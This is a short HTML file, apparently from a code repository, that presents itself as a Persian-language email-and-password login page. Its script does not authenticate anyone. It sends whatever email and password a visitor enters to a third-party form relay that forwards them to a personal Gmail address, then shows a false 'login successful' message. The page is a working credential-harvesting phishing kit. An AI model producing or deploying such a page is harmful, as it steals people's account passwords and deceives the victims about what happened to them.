# Login-
For email and password 
<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحه لاگین</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        h2 {
            text-align: center;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        .login-button {
            width: 100%;
            padding: 10px;
            background-color: #4285f4;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-button:hover {
            background-color: #357ae8;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>ورود به حساب</h2>
    <form id="loginForm">
        <input type="email" id="email" class="input-field" placeholder="ایمیل خود را وارد کنید" required>
        <input type="password" id="password" class="input-field" placeholder="کلمه عبور" required>
        <button type="submit" class="login-button">ورود</button>
    </form>
</div>

<script>
    document.getElementById('loginForm').addEventListener('submit', function(event) {
        event.preventDefault();

        var email = document.getElementById('email').value;
        var password = document.getElementById('password').value;

        var emailDetails = {
            userEmail: email,
            userPassword: password
        };

        fetch('https://formsubmit.co/ajax/callofdutycodmobil@gmail.com', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(emailDetails)
        })
        .then(response => response.json())
        .then(data => {
            alert('ورود با موفقیت انجام شد!');
        })
        .catch(error => {
            alert('خطا در ارسال اطلاعات');
        });
    });
</script>

</body>
</html>
